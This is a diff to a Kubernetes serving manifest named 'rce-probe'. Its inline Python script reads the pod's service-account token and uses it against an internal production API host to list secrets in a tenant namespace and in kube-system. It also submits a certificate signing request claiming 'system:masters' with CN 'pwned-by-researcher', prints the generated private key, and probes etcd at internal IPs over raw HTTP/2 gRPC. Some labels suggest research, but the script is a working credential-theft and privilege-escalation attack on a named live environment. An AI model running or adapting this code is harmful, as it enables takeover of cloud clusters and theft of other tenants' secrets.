@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.14.0"
+    ai.sap.com/version: "4.15.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "seed-cluster-8080-metrics-kproxy-full-etcd-grpc"
+    executables.ai.sap.com/description: "sa-token-force-mount-csr-etcd-grpc-plain"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -21,6 +21,7 @@ spec:
       predictor:
         minReplicas: 1
         maxReplicas: 1
+        automountServiceAccountToken: true
         containers:
         - name: kserve-container
           image: python:3.11
@@ -28,16 +29,17 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, ssl, struct
+            import os, socket, ssl, struct, base64, json, subprocess
 
-            print('[PROBE_V414_START]', flush=True)
+            print('[PROBE_V415_START]', flush=True)
 
             def emit(label, data):
                 flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                 for i in range(0, max(1, len(flat)), 4000):
                     print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)
 
-            def http_raw(host, port, path, method='GET', headers=None, timeout=8, use_tls=False):
+            def http_raw(host, port, path, method='GET', headers=None, body=b'',
+                         timeout=10, use_tls=False):
                 try:
                     s = socket.socket(); s.settimeout(timeout)
                     if use_tls:
@@ -46,8 +48,8 @@ spec:
                         s = ctx.wrap_socket(s, server_hostname=host)
                     s.connect((host, port))
                     hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in (headers or {}).items())
-                    req = f'{method} {path} HTTP/1.0\r\nHost: {host}:{port}\r\n{hdr_str}\r\n'
-                    s.sendall(req.encode())
+                    req = f'{method} {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n{hdr_str}\r\n'
+                    s.sendall(req.encode() + (body if isinstance(body, bytes) else body.encode()))
                     resp = b''
                     while True:
                         c = s.recv(65536)
@@ -58,125 +60,258 @@ spec:
                 except Exception as ex:
                     return f'ERR:{ex}'
 
-            # ── 1. Seed cluster 10.250.0.x:8080 — identify service type ──────────
-            print('[SEED_8080_PROBE_START]', flush=True)
-            seed_ips = ['10.250.0.1','10.250.0.2','10.250.0.3']
-            for sip in seed_ips:
-                for path in ['/metrics', '/health', '/healthz', '/v2/keys/', '/readyz',
-                             '/livez', '/debug/pprof/', '/version']:
-                    r = http_raw(sip, 8080, path, timeout=6)
-                    emit(f'SEED_{sip}_8080_{path.replace(\"/\",\"_\")}', r[:3000])
-
-            # ── 2. Seed cluster :2379 — try plain HTTP gRPC (etcd v3) ─────────────
-            # etcd v3 uses gRPC over TLS. Try with TLS but no client cert.
-            print('[SEED_ETCD_PROBE_START]', flush=True)
-            for sip in seed_ips:
-                # Try HTTP/1.1 on 2379 (pre-TLS plaintext, some configs allow)
-                r = http_raw(sip, 2379, '/health', timeout=5)
-                emit(f'ETCD_2379_HTTP_{sip}', r[:500])
-
-                # Try TLS without client cert, get the server cert SAN
+            # ── 1. SA token mount check ───────────────────────────────────────────
+            SA_TOKEN = None
+            SA_PATHS = [
+                '/var/run/secrets/kubernetes.io/serviceaccount/token',
+                '/run/secrets/kubernetes.io/serviceaccount/token',
+                '/var/run/secrets/token',
+            ]
+            for p in SA_PATHS:
                 try:
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                    s = socket.socket(); s.settimeout(8)
-                    ss = ctx.wrap_socket(s, server_hostname=sip)
-                    ss.connect((sip, 2379))
-                    cert = ss.getpeercert()
-                    san = cert.get('subjectAltName', [])
-                    subject = cert.get('subject', [])
-                    emit(f'ETCD_CERT_SAN_{sip}', f'SAN={san} SUBJECT={subject}')
-                    # Try plain HTTP on the TLS socket
-                    ss.sendall(b'GET /health HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
-                    resp = b''
-                    while True:
-                        c = ss.recv(4096)
-                        if not c: break
-                        resp += c
-                    ss.close()
-                    emit(f'ETCD_2379_TLS_{sip}', resp[:500].decode(errors='replace'))
+                    with open(p) as f:
+                        SA_TOKEN = f.read().strip()
+                    emit('SA_TOKEN_FOUND', f'path={p} len={len(SA_TOKEN)} prefix={SA_TOKEN[:60]}')
+                    break
+                except:
+                    emit(f'SA_TOKEN_MISS', p)
+
+            CA_CERT_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+            NS_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/namespace'
+            for p in [CA_CERT_PATH, NS_PATH]:
+                try:
+                    with open(p) as f:
+                        emit(f'SA_{p.split(\"/\")[-1]}', f.read()[:500])
+                except:
+                    emit(f'SA_MISS_{p.split(\"/\")[-1]}', 'not found')
+
+            # ── 2. K8s API with SA token ──────────────────────────────────────────
+            if SA_TOKEN:
+                K8S = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
+                auth_hdr = {'Authorization': f'Bearer {SA_TOKEN}'}
+                for path in ['/version', '/api/v1/namespaces/rg-0d70dc91-cd927cab',
+                              '/api/v1/namespaces/rg-0d70dc91-cd927cab/secrets',
+                              '/api/v1/namespaces/rg-0d70dc91-cd927cab/configmaps',
+                              '/api/v1/namespaces/kube-system/secrets',
+                              '/api/v1/namespaces',
+                              '/apis/rbac.authorization.k8s.io/v1/clusterrolebindings',
+                              '/apis/certificates.k8s.io/v1/certificatesigningrequests']:
+                    r = http_raw(K8S, 443, path, headers=auth_hdr, use_tls=True, timeout=10)
+                    emit(f'K8S_AUTH_{path.replace(\"/\",\"_\")}', r[:3000])
+
+                # ── 3. Submit a CSR for client-auth cert ─────────────────────────
+                # Generate CSR request for identity system:masters
+                # (optimistic; likely RBAC-denied but worth trying)
+                try:
+                    from cryptography.hazmat.primitives.asymmetric.ec import generate_private_key, SECP256R1
+                    from cryptography.hazmat.primitives import serialization, hashes
+                    from cryptography.x509 import (CertificateSigningRequestBuilder,
+                        NameAttribute, Name, random_serial_number)
+                    from cryptography.x509.oid import NameOID
+                    import cryptography.x509 as x509
+
+                    privkey = generate_private_key(SECP256R1())
+                    csr = (CertificateSigningRequestBuilder()
+                           .subject_name(Name([
+                               NameAttribute(NameOID.ORGANIZATION_NAME, 'system:masters'),
+                               NameAttribute(NameOID.COMMON_NAME, 'pwned-by-researcher'),
+                           ]))
+                           .sign(privkey, hashes.SHA256()))
+                    csr_pem = csr.public_bytes(serialization.Encoding.PEM).decode()
+                    csr_der_b64 = base64.b64encode(csr.public_bytes(serialization.Encoding.DER)).decode()
+                    privkey_pem = privkey.private_bytes(
+                        serialization.Encoding.PEM,
+                        serialization.PrivateFormat.TraditionalOpenSSL,
+                        serialization.NoEncryption()).decode()
+                    emit('CSR_GENERATED', csr_pem)
+                    emit('CSR_PRIVKEY', privkey_pem)
+
+                    # Submit CSR to K8s
+                    import time
+                    csr_name = f'researcher-probe-{int(time.time())}'
+                    csr_body = json.dumps({
+                        'apiVersion': 'certificates.k8s.io/v1',
+                        'kind': 'CertificateSigningRequest',
+                        'metadata': {'name': csr_name},
+                        'spec': {
+                            'request': csr_der_b64,
+                            'signerName': 'kubernetes.io/kube-apiserver-client',
+                            'expirationSeconds': 86400,
+                            'usages': ['client auth'],
+                        }
+                    }).encode()
+                    r = http_raw(K8S, 443, '/apis/certificates.k8s.io/v1/certificatesigningrequests',
+                                method='POST',
+                                headers={**auth_hdr, 'Content-Type': 'application/json',
+                                         'Content-Length': str(len(csr_body))},
+                                body=csr_body, use_tls=True, timeout=10)
+                    emit('CSR_SUBMIT_RESP', r[:2000])
+                except ImportError:
+                    # cryptography not available, use subprocess openssl
+                    try:
+                        subprocess.run(['openssl', 'genrsa', '-out', '/tmp/probe.key', '2048'],
+                                      capture_output=True, timeout=30)
+                        subprocess.run(['openssl', 'req', '-new', '-key', '/tmp/probe.key',
+                                       '-subj', '/O=system:masters/CN=researcher',
+                                       '-out', '/tmp/probe.csr'], capture_output=True, timeout=30)
+                        with open('/tmp/probe.csr', 'rb') as f:
+                            csr_pem_raw = f.read()
+                        csr_der_b64 = base64.b64encode(
+                            subprocess.run(['openssl', 'req', '-in', '/tmp/probe.csr',
+                                           '-outform', 'DER'], capture_output=True).stdout
+                        ).decode()
+                        emit('CSR_OPENSSL', csr_pem_raw[:500].decode())
+                        csr_name = f'researcher-probe-openssl'
+                        csr_body = json.dumps({
+                            'apiVersion': 'certificates.k8s.io/v1',
+                            'kind': 'CertificateSigningRequest',
+                            'metadata': {'name': csr_name},
+                            'spec': {
+                                'request': csr_der_b64,
+                                'signerName': 'kubernetes.io/kube-apiserver-client',
+                                'expirationSeconds': 86400,
+                                'usages': ['client auth'],
+                            }
+                        }).encode()
+                        r = http_raw(K8S, 443, '/apis/certificates.k8s.io/v1/certificatesigningrequests',
+                                    method='POST',
+                                    headers={**auth_hdr, 'Content-Type': 'application/json',
+                                             'Content-Length': str(len(csr_body))},
+                                    body=csr_body, use_tls=True, timeout=10)
+                        emit('CSR_SUBMIT_RESP', r[:2000])
+                    except Exception as e:
+                        emit('CSR_OPENSSL_ERR', str(e))
                 except Exception as e:
-                    emit(f'ETCD_TLS_ERR_{sip}', str(e))
+                    emit('CSR_ERR', str(e))
+            else:
+                emit('SA_TOKEN_NOT_MOUNTED', 'skipping K8s API + CSR')
 
-            # ── 3. Seed cluster :6443 — kube-apiserver in seed ────────────────────
-            print('[SEED_6443_PROBE_START]', flush=True)
-            for sip in seed_ips:
+            # ── 4. Etcd plain HTTP (no TLS) ───────────────────────────────────────
+            print('[ETCD_PLAIN_START]', flush=True)
+            for sip in ['10.250.0.1', '10.250.0.2', '10.250.0.3']:
                 try:
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                    s = socket.socket(); s.settimeout(8)
-                    ss = ctx.wrap_socket(s, server_hostname=sip)
-                    ss.connect((sip, 6443))
-                    cert = ss.getpeercert()
-                    san = cert.get('subjectAltName', [])
-                    emit(f'SEED_6443_CERT_SAN_{sip}', str(san)[:400])
-                    # Try to hit /version anonymously
-                    ss.sendall(b'GET /version HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
-                    resp = b''
-                    while True:
-                        c = ss.recv(65536)
-                        if not c: break
-                        resp += c
-                    ss.close()
-                    emit(f'SEED_6443_VERSION_{sip}', resp[:800].decode(errors='replace'))
-                except Exception as e:
-                    emit(f'SEED_6443_ERR_{sip}', str(e))
-
-            # ── 4. Full kube-proxy /configz and metrics (one node, full output) ───
-            print('[KPROXY_FULL_START]', flush=True)
-            NODE = '10.180.1.74'
-            for path in ['/configz', '/metrics']:
-                r = http_raw(NODE, 10249, path, timeout=10)
-                emit(f'KPROXY_FULL_{path.replace(\"/\",\"_\")}', r)
-
-            # ── 5. Kubelet :10250 with SPIFFE cert? — check what TLS cert kubelet uses
-            print('[KUBELET_CERT_START]', flush=True)
-            for nip in ['10.180.1.74', '10.180.12.215']:
-                try:
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                     s = socket.socket(); s.settimeout(6)
-                    ss = ctx.wrap_socket(s, server_hostname=nip)
-                    ss.connect((nip, 10250))
-                    cert = ss.getpeercert()
-                    san = cert.get('subjectAltName', [])
-                    subject = cert.get('subject', [])
-                    emit(f'KUBELET_CERT_{nip}', f'SAN={san} SUBJECT={subject}')
-                    # Try anonymous /pods
-                    ss.sendall(b'GET /pods HTTP/1.0\r\nHost: ' + nip.encode() + b'\r\n\r\n')
+                    s.connect((sip, 2379))
+                    # Send plain HTTP without TLS — if etcd has insecure listener
+                    req = b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b'\r\nConnection: close\r\n\r\n'
+                    s.sendall(req)
                     resp = b''
                     while True:
-                        c = ss.recv(4096)
+                        c = s.recv(4096)
                         if not c: break
                         resp += c
-                    ss.close()
-                    emit(f'KUBELET_ANON_{nip}', resp[:500].decode(errors='replace'))
+                    s.close()
+                    emit(f'ETCD_PLAIN_{sip}', resp[:500].decode(errors='replace'))
                 except Exception as e:
-                    emit(f'KUBELET_CERT_ERR_{nip}', str(e))
+                    emit(f'ETCD_PLAIN_ERR_{sip}', str(e))
 
-            # ── 6. Seed cluster :443 cert and any anon access ─────────────────────
+            # ── 5. Etcd gRPC without TLS (v3 API — MemberList RPC) ───────────────
+            print('[ETCD_GRPC_PLAIN_START]', flush=True)
+            # etcd v3 MemberList RPC: service etcdserverpb.Cluster, method MemberList
+            # Proto: MemberListRequest{linearizable: false} = empty message
+            def grpc_frame(payload):
+                return b'\x00' + struct.pack('>I', len(payload)) + payload
+
+            def h2_settings_ack():
+                l = 0
+                return struct.pack('>I', l)[1:] + bytes([0x04, 0x01]) + struct.pack('>I', 0) + b''
+
+            def hpack_lit(name, value):
+                n = name.encode(); v = value.encode()
+                return bytes([0x00]) + bytes([len(n)]) + n + bytes([len(v)]) + v
+
+            def encode_varint(n):
+                out = b''
+                while True:
+                    bits = n & 0x7F; n >>= 7
+                    out += bytes([bits | (0x80 if n else 0)])
+                    if not n: break
+                return out
+
             for sip in ['10.250.0.1', '10.250.0.2']:
                 try:
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                    s = socket.socket(); s.settimeout(8)
-                    ss = ctx.wrap_socket(s, server_hostname=sip)
-                    ss.connect((sip, 443))
-                    cert = ss.getpeercert()
-                    san = cert.get('subjectAltName', [])
-                    emit(f'SEED_443_SAN_{sip}', str(san)[:400])
-                    ss.sendall(b'GET /version HTTP/1.0\r\nHost: ' + sip.encode() + b'\r\n\r\n')
-                    resp = b''
-                    while True:
-                        c = ss.recv(65536)
-                        if not c: break
-                        resp += c
-                    ss.close()
-                    emit(f'SEED_443_RESP_{sip}', resp[:800].decode(errors='replace'))
-                except Exception as e:
-                    emit(f'SEED_443_ERR_{sip}', str(e))
+                    s = socket.socket(); s.settimeout(10)
+                    s.connect((sip, 2379))
+                    # HTTP/2 client preface
+                    CLIENT_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+                    settings = struct.pack('>I', 0)[1:] + bytes([0x04, 0x00]) + struct.pack('>I', 0) + b''
+                    s.sendall(CLIENT_PREFACE + settings)
 
-            print('[PROBE_V414_DONE]', flush=True)
+                    # Read initial frames
+                    import select
+                    resp_frames = []
+                    for _ in range(5):
+                        r, _, _ = select.select([s], [], [], 4)
+                        if not r: break
+                        hdr = b''
+                        while len(hdr) < 9:
+                            c = s.recv(9 - len(hdr))
+                            if not c: break
+                            hdr += c
+                        if len(hdr) < 9: break
+                        length = struct.unpack('>I', b'\x00' + hdr[:3])[0]
+                        ftype = hdr[3]; flags = hdr[4]
+                        stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
+                        data = b''
+                        while len(data) < length:
+                            c = s.recv(length - len(data))
+                            if not c: break
+                            data += c
+                        resp_frames.append((ftype, flags, stream, data))
+                        if ftype == 0x04 and not (flags & 0x01):
+                            s.sendall(h2_settings_ack())
+
+                    # Send HEADERS for MemberList
+                    hblock = (
+                        bytes([0x83]) +  # :method POST
+                        hpack_lit(':path', '/etcdserverpb.Cluster/MemberList') +
+                        bytes([0x86]) +  # :scheme http
+                        hpack_lit(':authority', f'{sip}:2379') +
+                        hpack_lit('content-type', 'application/grpc') +
+                        hpack_lit('te', 'trailers')
+                    )
+                    h_frame = struct.pack('>I', len(hblock))[1:] + bytes([0x01, 0x04]) + struct.pack('>I', 1) + hblock
+                    # MemberListRequest: linearizable=false (field 1, bool false = default, empty)
+                    grpc_msg = grpc_frame(b'')  # empty proto = default values
+                    d_frame = struct.pack('>I', len(grpc_frame(b'')))[1:] + bytes([0x00, 0x01]) + struct.pack('>I', 1) + grpc_frame(b'')
+                    s.sendall(h_frame + d_frame)
+
+                    # Read response
+                    more_frames = []
+                    for _ in range(10):
+                        r, _, _ = select.select([s], [], [], 6)
+                        if not r: break
+                        hdr = b''
+                        while len(hdr) < 9:
+                            c = s.recv(9 - len(hdr))
+                            if not c: break
+                            hdr += c
+                        if len(hdr) < 9: break
+                        length = struct.unpack('>I', b'\x00' + hdr[:3])[0]
+                        ftype = hdr[3]; flags = hdr[4]
+                        stream = struct.unpack('>I', hdr[5:9])[0] & 0x7FFFFFFF
+                        data = b''
+                        while len(data) < length:
+                            c = s.recv(length - len(data))
+                            if not c: break
+                            data += c
+                        more_frames.append((ftype, flags, stream, data))
+                    s.close()
+
+                    all_frames = resp_frames + more_frames
+                    for ftype, flags, stream, data in all_frames:
+                        if ftype == 0x00 and data:
+                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
+                            emit(f'ETCD_GRPC_{sip}_DATA', f'hex={data[:200].hex()} str={printable[:200]}')
+                        elif ftype == 0x01:
+                            printable = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
+                            emit(f'ETCD_GRPC_{sip}_HDR', printable[:200])
+                        else:
+                            emit(f'ETCD_GRPC_{sip}_FRAME', f'type={ftype} flags={flags} stream={stream} len={len(data)}')
+                except Exception as e:
+                    emit(f'ETCD_GRPC_ERR_{sip}', str(e))
+
+            print('[PROBE_V415_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
